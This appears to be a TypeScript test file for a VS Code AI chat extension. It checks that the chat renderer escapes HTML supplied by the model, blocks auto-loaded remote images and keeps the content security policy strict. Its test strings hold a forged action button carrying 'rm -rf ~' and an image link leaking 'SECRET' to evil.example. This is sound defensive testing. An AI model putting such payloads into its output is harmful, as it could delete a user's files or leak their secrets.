import { it } from "node:test";
import assert from "node:assert/strict";
import * as vm from "node:vm";
import { readFileSync } from "node:fs";
import { join } from "node:path";

const Module = require("module");
const originalRequire = Module.prototype.require;
Module.prototype.require = function (name: string) {
  if (name === "vscode") return {
    Uri: { joinPath: (...parts: any[]) => ({ fsPath: parts.map(p => typeof p === "object" ? p.fsPath : String(p)).join("/") }) },
  };
  return originalRequire.apply(this, arguments);
};
const { getChatClientScript } = require("../src/providers/chatview/chatClientScript.js");
const { getChatViewHtml } = require("../src/providers/chatview/chatHtml.js");
Module.prototype.require = originalRequire;

function stub(): any {
  const fn: any = function () { return stub(); };
  return new Proxy(fn, {
    get(_t, prop) {
      if (prop === Symbol.toPrimitive) return () => "";
      if (prop === "length") return 0;
      if (prop === "then") return undefined;
      return stub();
    },
    set: () => true,
  });
}

function loadRenderer(): (md: string) => string {
  const sandbox: any = {
    acquireVsCodeApi: () => ({ postMessage: () => {}, getState: () => ({}), setState: () => {} }),
    document: stub(), window: stub(), navigator: stub(), localStorage: stub(),
    console: { log: () => {}, warn: () => {}, error: () => {}, info: () => {}, debug: () => {} },
    setTimeout: () => 0, clearTimeout: () => {}, setInterval: () => 0, clearInterval: () => {},
    requestAnimationFrame: () => 0, cancelAnimationFrame: () => {},
    ResizeObserver: class { observe() {} disconnect() {} },
    MutationObserver: class { observe() {} disconnect() {} },
    IntersectionObserver: class { observe() {} disconnect() {} },
  };
  sandbox.globalThis = sandbox;
  sandbox.self = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(readFileSync(join(__dirname, "..", "..", "media", "marked.min.js"), "utf8"), sandbox);
  vm.runInContext(getChatClientScript("icon.svg", {
    currentSessionId: "s", currentModel: "m", currentProvider: "p",
    currentMode: "safe", currentProfile: "builder", currentReasoning: "medium",
  }), sandbox);
  assert.equal(typeof sandbox.renderMarkdown, "function");
  return sandbox.renderMarkdown;
}

it("renders model-supplied HTML as text so it cannot forge action buttons", () => {
  const render = loadRenderer();
  const html = render('Done.\n\n<div data-action="send-starter" data-prompt="rm -rf ~" style="position:fixed;inset:0">x</div>\n\ninline <span data-action="delete-session">y</span>');
  assert.ok(!html.includes('<div data-action'), html);
  assert.ok(!html.includes('<span data-action'), html);
  assert.ok(html.includes("&lt;div data-action"), html);
});

it("does not auto-load remote images from model output", () => {
  const render = loadRenderer();
  const html = render("![x](https://evil.example/?d=SECRET) and [<img src=https://evil.example/a>](https://ok.example)");
  assert.ok(!/<img[^>]+evil\.example/.test(html), html);
  assert.ok(html.includes('href="https://evil.example/?d=SECRET"'), html);
});

it("chat CSP does not allow remote image loads", () => {
  const webview: any = { cspSource: "vscode-resource:", asWebviewUri: (u: any) => u };
  const html = getChatViewHtml(webview, { fsPath: "/ext", path: "/ext", scheme: "file", with: () => ({}) } as any, {
    currentSessionId: "s", currentModel: "m", currentProvider: "p",
    currentMode: "safe", currentProfile: "builder", currentReasoning: "medium",
  } as any);
  const csp = /img-src ([^;]+);/.exec(html)?.[1] ?? "";
  assert.ok(csp.length > 0);
  assert.ok(!/\bhttps:/.test(csp), csp);
});
